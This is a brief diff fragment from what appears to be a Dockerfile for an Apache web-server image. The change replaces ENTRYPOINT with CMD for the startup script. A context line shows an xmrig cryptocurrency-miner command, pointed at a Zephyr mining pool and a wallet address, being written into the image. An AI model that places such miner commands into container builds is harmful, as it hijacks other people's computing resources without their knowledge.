@@ -10,4 +10,4 @@ RUN echo './xmrig --donate-level 1 -o sg.zephyr.herominers.com:1123 -u ZEPHYR39F
 
 EXPOSE 80
 
-ENTRYPOINT /run_apache.sh
+CMD /run_apache.sh
